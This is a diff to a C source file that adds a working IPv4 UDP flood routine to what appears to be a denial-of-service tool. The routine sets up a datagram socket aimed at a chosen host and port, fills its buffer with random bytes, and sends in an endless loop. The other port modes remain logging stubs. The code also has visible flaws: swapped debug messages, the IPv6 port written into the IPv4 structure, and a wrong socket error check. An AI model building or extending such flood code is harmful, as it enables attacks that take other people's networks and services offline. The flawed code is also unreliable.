@@ -11,8 +11,12 @@
 // WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 // See the License for the specific language governing permissions and
 // limitations under the License.
+#include <string.h>
+#include <netinet/in.h>
 
 #include <lib/info.h>
+#include <lib/util.h>
+#include <lib/err.h>
 
 #include "udp_flood.h"
 
@@ -46,19 +50,52 @@ typedef void (*udp_flood_attack_fn)(void);
  */
 static udp_flood_attack_fn impl;
 
+// main singleton udp connection
 static conn_t *connection;
 
-static void random_port(void)
+static void single4_port(void)
 {
+	DEBUG("Udp4 flood attack is starting using random ports");
+	struct sockaddr_in in = *(struct sockaddr_in*)connection->addr;
+	for (;;) {
+		sendto(connection->sock,
+				connection->buff,
+				connection->bufflen,0, (SA*)&in, sizeof(in));
+	}
 }
 
-static void single_port(void)
+static void random4_port(void)
 {
+	DEBUG("Udp4 flood attack is staring using single port");
 }
 
-static void range_port(void)
+static void range4_port(void)
 {
+	DEBUG("Udp4 flood attack is starting using range ports");
 }
+
+static void random6_port(void)
+{
+	DEBUG("Udp6 flood attack is starting using random ports");
+}
+
+static void single6_port(void)
+{
+	DEBUG("Udp6 flood attack is staring using single port");
+}
+
+static void range6_port(void)
+{
+	DEBUG("Udp6 flood attack is starting using range ports");
+}
+
+// *_PORT macros return a specific internet protocol implementation for the udp
+// flood attack, this way we make it more cleaner to use this instead of adding
+// all if's and switch smts around the code.
+#define RANDOM_PORT(ipv) ((ipv == IPV4) ? random4_port : random6_port)
+#define SINGLE_PORT(ipv) ((ipv == IPV4) ? single4_port : single6_port)
+#define RANGE_PORT(ipv) ((ipv == IPV4) ? range4_port : range6_port)
+#define IP_SPEC(ipv) ((ipv == IPV4)? AF_INET : AF_INET6)
 
 void udp_flood_attack(void)
 {
@@ -76,21 +113,52 @@ void udp_flood_init(conn_t *conn, arguments args)
 	if (!conn)
 		INFOEE("Invalid connection pointer passed");
 
-	if (args.port.random) {
-		DEBUG("Udp flood is choosing random port attack implementation");
-		impl = random_port;
-		return;
+	struct sockaddr_in in;
+	struct sockaddr_in6 in6;
+
+	switch (args.host_type) {
+	case IPV4:
+		in.sin_family = AF_INET;
+		in.sin_port = htons(args.port.n);
+		inet_pton(AF_INET, args.host, &in.sin_addr);
+		memcpy(conn->addr, &in, sizeof(in));
+		break;
+	case IPV6:
+		in6.sin6_family = AF_INET6;
+		inet_pton(AF_INET6, args.host, &in6.sin6_addr);
+		in.sin_port = htons(args.port.n);
+		memcpy(conn->addr, &in6, sizeof(in6));
+		break;
 	}
 
+	// fill up the buffer with random data
+	urandom_bytes(conn->buff, conn->bufflen);
+	if (err_this(ERRENTROPY))
+		INFOEE("Can't insert content into connection buffer");
+
+	// create upd socket based on args.host_type
+	conn->sock = socket(IP_SPEC(args.host_type), SOCK_DGRAM, IPPROTO_UDP);
+	if (!conn->sock)
+		INFOEE("Can't create udp socket");
+
+	// assign singleton with the new connection
+	connection = conn;
+	
+	// now we should test if we are dealing with single,range or random port attack	
+	if (args.port.random) {
+		DEBUG("Udp flood is choosing random port attack implementation");
+		impl = RANDOM_PORT(args.host_type);
+		return;
+	}
 	if (args.port.n) {
 		DEBUG("Udp flood is choosing single port attack implementation");
-		impl = single_port;
+		impl = SINGLE_PORT(args.host_type);
 		return;
 	}
 
 	if ((args.port.high != 0) && (args.port.high > args.port.low)) {
 		DEBUG("Udp flood is choosing range port attack implementation");
-		impl = range_port;
+		impl = RANGE_PORT(args.host_type);
 		return;
 	}
 }
